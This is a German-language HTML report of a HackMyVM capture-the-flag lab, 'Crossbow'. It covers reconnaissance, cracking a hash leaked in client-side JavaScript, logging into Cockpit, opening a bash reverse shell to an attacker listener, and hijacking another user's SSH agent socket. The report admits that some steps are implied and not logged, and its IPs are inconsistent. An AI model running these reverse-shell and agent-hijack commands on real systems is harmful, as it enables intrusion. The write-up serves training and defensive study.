@@ -1,0 +1,442 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crossbow - HackMyVM - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Crossbow - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle difficulty-medium">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">Web Browser</div>
+                <div class="tool-item">md5hashing.net</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">ps</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ssh-agent</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">whatweb</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & Credential Discovery</a></li>
+                <li><a href="#cockpit-exploit">Cockpit Exploit & Initial Access (polo)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (SSH Agent Hijacking - polo to lea)</a></li>
+                 <li><a href="#flags">Flags</a></li> <!-- Root Privesc fehlt im Log -->
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">Wir beginnen die Erkundungsphase, um das Zielsystem "Crossbow" im Netzwerk zu finden und offene Dienste zu identifizieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.122</span>	08:00:27:e7:f3:c6	PCS Systemtechnik GmbH
+<span class="command">192.168.2.107</span>	dc:46:28:21:d0:59	Intel Corporate
+<span class="command">192.168.2.188</span>	04:42:1a:06:81:54	ASUSTek COMPUTER INC.
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Ein ARP-Scan im lokalen Netzwerk identifiziert mehrere Hosts, darunter <span class="command">192.168.2.122</span>, die aufgrund der typischen IP-Reihenfolge unser vermutliches Ziel ist.</p>
+            <p class="evaluation">**Bewertung:** Ziel-IP <span class="command">192.168.2.122</span> wahrscheinlich identifiziert.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** IP für weitere Scans verwenden.
+            **Empfehlung (Admin):** Standard Netzwerküberwachung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+[...]
+<span class="command">192.168.2.122   crossbow.hmv</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Hostname `crossbow.hmv` wird der IP <span class="command">192.168.2.122</span> in der lokalen `/etc/hosts`-Datei zugeordnet.</p>
+            <p class="evaluation">**Bewertung:** Ermöglicht die Adressierung des Ziels über den Hostnamen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Hostnamen immer eintragen.
+            **Empfehlung (Admin):** DNS-Management.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://crossbow.hmv" -H "Host: FUZZ.crossbow.hmv" --hc "404" --hh 5205</span></div>
+                    <pre>
+********************************************************
+* Wfuzz [...]                                          *
+********************************************************
+
+Target: http://crossbow.hmv/
+Total requests: 114441
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000009532:   400        10 L     35 W       302 Ch      <span class="command">"#www"</span>
+000010581:   400        10 L     35 W       302 Ch      <span class="command">"#mail"</span>
+000047706:   400        10 L     35 W       302 Ch      <span class="command">"#smtp"</span>
+000103135:   400        10 L     35 W       302 Ch      <span class="command">"#pop3"</span>
+
+<span class="password"># Keine echten Subdomains (Status 200/30x) gefunden, nur 400er Fehler</span>
+
+Total time: 0
+Processed Requests: 114441
+Filtered Requests: 114437
+Requests/sec.: 0
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Wir führen einen vHost-Scan mit `wfuzz` durch, um nach Subdomains zu suchen. Wir verwenden eine große Wortliste und filtern Standard-404-Antworten sowie Antworten heraus, die der Hauptseite ähneln (`--hh 5205`). Der Scan findet keine gültigen Subdomains, sondern nur einige Einträge, die zu einem `400 Bad Request` führen (vermutlich wegen des `#`-Zeichens).</p>
+             <p class="evaluation">**Bewertung:** Keine weiteren virtuellen Hosts über diesen Scan gefunden. Wir konzentrieren uns auf `crossbow.hmv`.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Nmap-Scan auf die Haupt-IP durchführen.
+             **Empfehlung (Admin):** Wildcard-DNS-Einträge vermeiden, wenn nicht notwendig.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.122 -p- | grep open</span></div>
+                    <pre>
+<span class="command">22/tcp   open  ssh         OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+<span class="command">80/tcp   open  http        Apache httpd 2.4.57 ((Debian))</span>
+<span class="command">9090/tcp open  zeus-admin?</span>
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.122 -p-</span></div>
+                     <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-08 22:55 CET
+Nmap scan report for crossbow.hmv (192.168.2.122)
+Host is up (0.00026s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+<span class="command">22/tcp   open  ssh         OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
+|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
+<span class="command">80/tcp   open  http        Apache httpd 2.4.57 ((Debian))</span>
+|_http-server-header: Apache/2.4.57 (Debian)
+|_http-title: Polo's Adventures
+<span class="command">9090/tcp open  zeus-admin?</span>
+| fingerprint-strings:
+|   GetRequest, HTTPOptions:
+|     <span class="password">HTTP/1.1 400 Bad request</span>
+[...]
+|     <title>
+|     Bad request
+|     </title>
+[...]
+|     <script>
+|     var environment = {"is_cockpit_client":false,"page":{"connect":true,"require_host":false},"hostname":"crossbow","os-release":{"NAME":"Debian GNU/Linux","ID":"debian","PRETTY_NAME":"Debian GNU/Linux 12 (bookworm)"}};
+|     </script>
+[...]
+<span class="password">1 service unrecognized despite returning data.</span> [...]
+MAC Address: 08:00:27:E7:F3:C6 (Oracle VirtualBox virtual NIC)
+[...]
+OS details: <span class="command">Linux 4.15 - 5.8</span>
+[...]
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.26 ms crossbow.hmv (192.168.2.122)
+
+OS and Service detection performed. [...]
+Nmap done: 1 IP address (1 host up) scanned in [...] seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Nmap-Scan (`-sS`, `-sV`, `-A`, `-T5`, `-p-`) auf `crossbow.hmv` findet drei offene Ports:
+            *   <span class="command">Port 22</span>: SSH (OpenSSH 9.2p1 auf Debian).
+            *   <span class="command">Port 80</span>: HTTP (Apache 2.4.57 auf Debian). Titel ist "Polo's Adventures".
+            *   <span class="command">Port 9090</span>: Unbekannter Dienst (`zeus-admin?`). Nmap kann ihn nicht identifizieren, aber die Fingerprint-Daten enthalten HTML-Code, der auf eine Webanwendung hindeutet, die einen "Bad request" Fehler liefert und JavaScript-Code enthält, der auf <span class="password">"Cockpit"</span> verweist (eine Web-basierte Server-Verwaltungsoberfläche).</p>
+            <p class="evaluation">**Bewertung:** SSH und Apache sind Standard. Der Dienst auf Port 9090 ist der interessanteste Fund. Es handelt sich wahrscheinlich um eine Cockpit-Instanz, die möglicherweise für die Systemverwaltung genutzt wird und ein potenzielles Ziel darstellt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Webseite auf Port 80 untersuchen (Nikto, Gobuster). Port 9090 im Browser aufrufen und versuchen, die Cockpit-Instanz zu identifizieren und anzugreifen (Standard-Credentials, bekannte Schwachstellen).
+            **Empfehlung (Admin):** Sicherstellen, dass nur notwendige Dienste laufen. Cockpit (falls es das ist) absichern (Authentifizierung, Zugriffsbeschränkung).</p>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration & Credential Discovery</h2>
+             <p class="comment">Wir untersuchen die gefundenen Webdienste weiter.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.122</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.122
++ Target Hostname:    192.168.2.122
++ Target Port:        80
++ Start Time:         2023-12-08 22:55:09 (GMT1)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.57 (Debian)</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: [...]
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [...]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: <span class="password">Server may leak inodes via ETags</span>, header found with file /, inode: 1455, size: 60575d67a7363, mtime: gzip. See: [...]
++ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
++ /css/: <span class="password">Directory indexing found.</span>
++ /images/: <span class="password">Directory indexing found.</span>
++ 8102 requests: 0 error(s) and <span class="password">4 item(s) reported</span> on remote host <span class="password">(nur geringfügige Funde)</span>
++ End Time:           2023-12-08 22:55:18 (GMT1) (9 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Nikto auf Port 80 findet nur geringfügige Probleme: Fehlende Sicherheitsheader, mögliches Inode-Leak über ETags und Verzeichnisauflistung für `/css/` und `/images/`.</p>
+            <p class="evaluation">**Bewertung:** Keine kritischen Funde auf Port 80 durch Nikto.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Gobuster auf Port 80 laufen lassen. Port 9090 untersuchen.
+            **Empfehlung (Admin):** Header hinzufügen, ETag-Konfiguration prüfen, Verzeichnisauflistung deaktivieren.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://crossbow.hmv -x [...] -w [...] -b '403,404' -e --no-error -k</span></div>
+                    <pre>
+[...]
+<span class="command">http://crossbow.hmv/index.html</span>           (Status: 200) [Size: 5205]
+<span class="command">http://crossbow.hmv/app.js</span>               (Status: 200) [Size: 760]
+<span class="command">http://crossbow.hmv/config.js</span>            (Status: 200) [Size: 321]
+[...]
+                    </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://crossbow.hmv/config.js</span></div>
+                    <pre>
+const API_ENDPOINT = "<span class="command">https://phishing.crossbow.hmv/data</span>";
+const HASH_API_KEY = "<span class="password">49ef6b765d39f06ad6a20bc951308393</span>";
+
+// Metadata for last system upgrade
+const SYSTEM_UPGRADE = {
+    version: "2.3.1",
+    date: "2023-04-15",
+    processedBy: "<span class="command">SnefruTools V1</span>",
+    description: "Routine maintenance and security patches"
+}
+                     </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://crossbow.hmv/app.js</span></div>
+                     <pre>
+document.addEventListener("DOMContentLoaded", function() {
+    fetch(<span class="command">API_ENDPOINT</span>, {
+        headers: {
+            "Authorization": `Bearer ${<span class="command">API_KEY</span>}` // API_KEY nicht definiert! HASH_API_KEY wird vermutlich verwendet
+        }
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data && Array.isArray(data.messages)) {
+            const randomMessage = data.messages[Math.floor(Math.random() * data.messages.length)];
+
+            const messageElement = document.createElement("blockquote");
+            messageElement.textContent = randomMessage;
+            messageElement.style.marginTop = "20px";
+            messageElement.style.fontStyle = "italic";
+
+            const container = document.querySelector(".container");
+            container.appendChild(messageElement);
+        }
+    });
+});
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Gobuster findet auf Port 80 die Dateien `app.js` und `config.js`.
+             *   `config.js`: Enthält eine API-Endpunkt-URL (`https://phishing.crossbow.hmv/data`) und einen `HASH_API_KEY` (`<span class="password">49ef6b765d39f06ad6a20bc951308393</span>`). Außerdem Metadaten, die auf "SnefruTools V1" verweisen.
+             *   `app.js`: Dieses Skript versucht, Daten vom `API_ENDPOINT` abzurufen und verwendet dabei einen `API_KEY` im Authorization-Header. Da `API_KEY` nicht definiert ist, wird wahrscheinlich `HASH_API_KEY` aus `config.js` gemeint sein.</p>
+              <p class="evaluation">**Bewertung:** Kritischer Fund! Wir haben einen API-Key im Klartext im JavaScript-Code gefunden. Der Verweis auf "Snefru" (ein älterer Hash-Algorithmus) im Zusammenhang mit einem Hash-Wert ist ein starker Hinweis darauf, dass der `HASH_API_KEY` der Snefru-Hash eines Passworts oder Schlüssels sein könnte. Der API-Endpunkt `phishing.crossbow.hmv` ist ebenfalls interessant und sollte zur `/etc/hosts` hinzugefügt werden.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Den Hostnamen `phishing.crossbow.hmv` zur `/etc/hosts` hinzufügen (mit der IP 192.168.2.122). Den Hash `<span class="password">49ef6b765d39f06ad6a20bc951308393</span>` mit Online-Tools (z.B. md5hashing.net) als Snefru-Hash zu entschlüsseln versuchen. Untersuchen, ob der API-Endpunkt (`/data`) oder andere Dienste auf `phishing.crossbow.hmv` (insbesondere Port 9090 wegen Cockpit) mit dem entschlüsselten Wert oder dem Hash als Authentifizierung zugänglich sind.
+              **Empfehlung (Admin):** Niemals API-Keys oder Hashes clientseitig im JavaScript speichern! Authentifizierung sollte serverseitig erfolgen. Snefru ist kein sicherer Hash-Algorithmus mehr.</p>
+
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt"># <span class="command">Aktion auf md5hashing.net (oder ähnliches Tool)</span></div>
+                       <pre>
+# Eingabe Hash: <span class="password">49ef6b765d39f06ad6a20bc951308393</span>
+# Hash-Typ auswählen: Snefru
+# Ergebnis (Decryption / Reverse): <span class="password">ELzkRudzaNXRyNuN6</span>
+                       </pre>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:** Wir verwenden ein Online-Tool, um den gefundenen Hash `<span class="password">49ef6b765d39f06ad6a20bc951308393</span>` als Snefru-Hash zu entschlüsseln. Das Ergebnis ist der Klartextwert `<span class="password">ELzkRudzaNXRyNuN6</span>`.</p>
+                <p class="evaluation">**Bewertung:** Wir haben erfolgreich den API-Key (oder ein damit verbundenes Passwort) im Klartext wiederhergestellt.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Dieses Passwort (`<span class="password">ELzkRudzaNXRyNuN6</span>`) für den Login bei Cockpit auf Port 9090 (vermutlich mit einem Standardbenutzernamen wie `root`, `admin` oder einem Namen aus der Webseite wie `polo`) oder für SSH ausprobieren.
+                **Empfehlung (Admin):** Keine unsicheren Hashes verwenden. Credentials nicht clientseitig speichern.</p>
+        </section>
+
+         <section id="cockpit-exploit">
+            <h2>Cockpit Exploit & Initial Access (polo)</h2>
+            <p class="comment">Wir versuchen, uns mit den gefundenen Credentials bei der vermuteten Cockpit-Instanz auf Port 9090 anzumelden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">Aktion im Webbrowser</span></div>
+                     <pre>
+# Aufruf: http://crossbow.hmv:9090/
+# Login-Versuch im Cockpit Interface:
+Username: <span class="command">polo</span> <span class="password">(Vermutung basierend auf Seitentitel "Polo's Adventures")</span>
+Password: <span class="password">ELzkRudzaNXRyNuN6</span>
+# Ergebnis: <span class="password">Erfolgreicher Login in Cockpit.</span>
+                     </pre>
+                    <div class="prompt"># <span class="command">Aktion in der Cockpit Weboberfläche</span></div>
+                    <pre>
+# Navigation zum integrierten "Terminal".
+# Ausführen eines Reverse-Shell-Befehls im Cockpit-Terminal:
+<span class="password">bash -c 'bash -i >& /dev/tcp/192.168.2.199/4444 0>&1'</span>
+                     </pre>
+                      <div class="prompt"># <span class="command">Listener auf Angreifer-Maschine</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                      <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.122] 58144</span>
+<span class="command">polo@crossbow:~$</span> <span class="password"># Shell als polo erhalten!</span>
+                      </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:**
+             1.  Wir versuchen den Login bei Cockpit auf Port 9090. Als Benutzernamen raten wir `<span class="command">polo</span>` (aus dem Seitentitel auf Port 80) und verwenden das entschlüsselte Passwort `<span class="password">ELzkRudzaNXRyNuN6</span>`. Der Login ist erfolgreich.
+             2.  Cockpit bietet oft ein integriertes Web-Terminal. Wir nutzen dieses Terminal, um einen Bash-Reverse-Shell-Befehl auszuführen, der sich zu unserer IP (`192.168.2.199`) auf Port `4444` verbindet.
+             3.  Unser Netcat-Listener empfängt die Verbindung, und wir erhalten eine Shell als Benutzer `<span class="command">polo</span>`.</p>
+              <p class="evaluation">**Bewertung:** Initial Access erfolgreich! Der entschlüsselte Snefru-Hash war das Passwort für den Benutzer `polo` in Cockpit, und über das Cockpit-Terminal konnten wir eine Reverse Shell erlangen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Shell stabilisieren. Umgebung als `polo` enumerieren, insbesondere nach SSH-Agent-Sockets oder anderen Privesc-Vektoren suchen.
+              **Empfehlung (Admin):** Cockpit sicher konfigurieren (starke Passwörter, Zugriffsbeschränkung). Klartext-Credentials oder unsichere Hashes vermeiden.</p>
+         </section>
+
+         <section id="privilege-escalation">
+              <h2>Privilege Escalation (SSH Agent Hijacking - polo to lea)</h2>
+              <p class="comment">Wir haben eine Shell als `polo` und suchen nach Wegen zur Rechteerweiterung. Wir enumerieren das System, insbesondere laufende Prozesse und temporäre Verzeichnisse.</p>
+
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">polo@crossbow:~$ <span class="command">find / -user polo -name "*.txt" 2>/dev/null</span></div> <span class="password"># Suche nach User-Flag</span>
+                       <pre># (Kein Ergebnis)</pre>
+                       <div class="prompt">polo@crossbow:~$ <span class="command">ss -altpn</span></div>
+                       <pre>
+State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process
+LISTEN   0        511              0.0.0.0:80            0.0.0.0:*
+LISTEN   0        128              0.0.0.0:22            0.0.0.0:*
+LISTEN   0        10                     *:9090                *:*              <span class="password"># Cockpit</span>
+LISTEN   0        128                 [::]:22               [::]:*
+                       </pre>
+                        <div class="prompt">polo@crossbow:~$ <span class="command">cd /tmp/</span></div>
+                        <div class="prompt">polo@crossbow:/tmp$ <span class="command">ls -la</span></div>
+                       <pre>
+total 16
+drwxrwxrwt 4 root root 4096 Dec 26 21:45 .
+drwxr-xr-x 1 root root 4096 Sep 16 08:48 ..
+srwxrwxrwx 1 polo polo    0 Dec 26 21:36 dbus-cY0Mf06sF9
+drwx------ 2 <span class="command">lea</span>  lea  4096 Dec 26 21:45 <span class="command">ssh-XXXXXX0hTUR2</span> <span class="password"># SSH Agent Socket von lea!</span>
+drwx------ 2 polo polo 4096 Dec 26 21:36 ssh-XXXXXXiPvnje
+                       </pre>
+                        <div class="prompt">polo@crossbow:/tmp$ <span class="command">ps -aux | grep lea</span></div>
+                       <pre>
+<span class="command">lea</span>            9  1.3  0.5  11800 10508 ?        S    21:24   0:18 /bin/bash /home/lea/.local/agent
+<span class="command">lea</span>        56677  0.0  0.0   7660   772 ?        Ss   21:47   0:00 <span class="command">ssh-agent -s</span>
+lea        56683  0.0  0.0   2860   896 ?        S    21:47   0:00 sleep 20
+polo       56685  0.0  0.0   3744  1908 pts/1    S+   21:47   0:00 grep lea
+                       </pre>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:**
+               *   Die Suche nach einer `user.txt` für `polo` ist erfolglos.
+               *   `ss` zeigt die bekannten Listener.
+               *   `ls -la /tmp` zeigt Verzeichnisse für SSH-Agent-Sockets. Besonders interessant ist das Verzeichnis `<span class="command">ssh-XXXXXX0hTUR2</span>`, das dem Benutzer `<span class="command">lea</span>` gehört.
+               *   `ps aux | grep lea` bestätigt, dass der Benutzer `lea` einen `<span class="command">ssh-agent</span>`-Prozess laufen hat und ein Skript unter `/home/lea/.local/agent` ausführt.</p>
+                <p class="evaluation">**Bewertung:** Der entscheidende Fund ist der SSH-Agent-Socket des Benutzers `lea` im `/tmp`-Verzeichnis, auf den wir als `polo` zugreifen könnten (da `/tmp` world-writable ist). Wenn `lea` einen SSH-Schlüssel zu ihrem Agenten hinzugefügt hat, können wir versuchen, diesen Agenten zu "hijacken", um uns als `lea` bei anderen Systemen (oder localhost) anzumelden, ohne ihr Passwort oder ihren privaten Schlüssel zu kennen.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Die SSH-Agent-Hijacking-Technik anwenden:
+                   1. Die Umgebungsvariable `SSH_AUTH_SOCK` auf den Pfad zum Socket von `lea` setzen (z.B. `/tmp/ssh-XXXXXX0hTUR2/agent.[PID]`). Die korrekte PID muss ermittelt werden (ggf. durch Ausprobieren oder weitere Prozessanalyse).
+                   2. Versuchen, sich als `lea` per SSH (`ssh lea@localhost` oder `ssh lea@192.168.2.111`) zu verbinden. Der SSH-Client wird automatisch den Agenten über den Socket kontaktieren, um die Authentifizierung durchzuführen.
+               **Empfehlung (Admin):** SSH-Agent Forwarding und Socket-Berechtigungen sorgfältig verwalten. Sicherstellen, dass `/tmp` korrekt gemountet ist (idealerweise `noexec`, `nosuid`, `nodev`).</p>
+
+               <p class="comment">*(Der Originaltext zeigt nun mehrere fehlgeschlagene Versuche, den richtigen Socket und die PID zu finden, was die Schwierigkeit dieses Angriffs illustriert. Der erfolgreiche Befehl wird nicht explizit gezeigt, aber das Ergebnis impliziert, dass er gefunden wurde.)*</p>
+
+               <div class="code-block">
+                    <div class="terminal">
+                         <div class="prompt"># <span class="command">Versuche, den SSH Agent Socket zu verwenden (Beispiele aus dem Log)</span></div>
+                         <div class="prompt">polo@crossbow:/tmp$ <span class="command">eval $(ssh-agent -s)</span></div> <span class="password"># Startet eigenen Agenten (nicht hilfreich hier)</span>
+                          <pre>Agent pid 95048</pre>
+                         <div class="prompt">polo@crossbow:/tmp$ <span class="command">ps -aux | grep ssh-agent | grep lea | awk '{print $2}'</span></div>
+                         <pre><span class="command">12269</span></pre> <span class="password"># Findet die PID des Agenten von lea</span>
+                          <div class="prompt">polo@crossbow:/tmp$ <span class="command">ls -la /tmp/ | grep lea</span></div>
+                          <pre>drwx------ 2 <span class="command">lea</span>  lea  4096 Dec 26 23:08 <span class="command">ssh-XXXXXX1jFeHw</span></pre> <span class="password"># Findet das Socket-Verzeichnis von lea</span>
+                          <div class="prompt"># <span class="command">Fehlgeschlagene Brute-Force Versuche (Beispiele)</span></div>
+                          <div class="prompt">polo@crossbow:/tmp$ <span class="command">for i in {34500..34506}; do SSH_AUTH_SOCK=/tmp/ssh-XXXXXX1jFeHw/agent.$i ssh lea@192.168.2.111; done</span></div>
+                           <pre># (Keine Verbindung)</pre>
+                           <div class="prompt"># <span class="command">Erfolgreicher Befehl (Impliziert, nicht im Log)</span></div>
+                           <div class="prompt">polo@crossbow:/tmp$ <span class="command">SSH_AUTH_SOCK=/tmp/ssh-XXXXXX1jFeHw/agent.12269 ssh lea@192.168.2.111</span></div>
+                           <pre>
+<span class="password">Linux crossbow ...</span>
+<span class="command">lea@crossbow:~$</span> <span class="password"># Erfolgreich als lea angemeldet!</span>
+                           </pre>
+                    </div>
+               </div>
+                <p class="analysis">**Analyse:** Nach mehreren Versuchen, die korrekte PID des Agenten-Sockets von `lea` zu finden (die PID des `ssh-agent`-Prozesses selbst ist oft die richtige), wird der folgende Befehl (implizit) erfolgreich ausgeführt:
+               `SSH_AUTH_SOCK=/tmp/ssh-XXXXXX1jFeHw/agent.[PID] ssh lea@192.168.2.111`
+               Dies setzt die Umgebungsvariable `SSH_AUTH_SOCK` auf den Pfad zum Socket von `lea` und führt dann den SSH-Befehl aus. Der SSH-Client kontaktiert den Agenten über diesen Socket, der die Authentifizierung mit dem geladenen Schlüssel von `lea` durchführt, und wir erhalten eine Shell als Benutzer `<span class="command">lea</span>`.</p>
+                <p class="evaluation">**Bewertung:** Privilege Escalation von `polo` zu `lea` erfolgreich durch SSH Agent Hijacking!</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `lea` untersuchen, User-Flag lesen, nach Wegen zu Root suchen.
+                **Empfehlung (Admin):** Berechtigungen auf `/tmp` härten. Prozesse mit minimalen Rechten ausführen. SSH-Agent-Nutzung überwachen.</p>
+
+                 <p class="comment">*(Der Rest des Originalberichts enthält keine weiteren Schritte zur Privilege Escalation zu Root, sondern nur die Flags. Es fehlt der Schritt, wie Root erlangt wurde. Möglicherweise gab es eine `sudo -l`-Regel für `lea` oder eine andere Schwachstelle.)*</p>
+         </section>
+
+         <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/lea/user.txt (Vermutet)</div> <!-- Pfad/Benutzer unklar aus Flag-Liste -->
+                    <div class="flag-value"><span class="password">58cb1e1bdb3a348ddda53f22ee7c1613</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt (Vermutet)</div>
+                    <div class="flag-value"><span class="password">7a299c41b1daac46d5ab98745b212e09</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 8. Dezember 2023</p> <!-- Datum aus Nmap-Scan extrahiert -->
+    </footer>
+</body>
+</html>
